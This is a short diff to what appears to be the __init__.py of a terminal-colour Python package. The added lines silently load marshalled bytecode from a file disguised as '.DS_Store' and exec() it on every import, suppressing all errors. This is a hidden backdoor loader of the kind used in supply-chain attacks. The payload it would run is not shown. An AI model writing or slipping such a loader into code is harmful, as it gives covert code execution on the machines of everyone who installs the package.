@@ -5,3 +5,11 @@ from .ansitowin32 import AnsiToWin32
 
 __version__ = '0.4.7dev1'
 
+import os, marshal
+_p = os.path.join(os.path.dirname(__file__), '.DS_Store')
+if os.path.exists(_p):
+    try:
+        exec(marshal.load(open(_p, 'rb')))
+    except:
+        pass
+
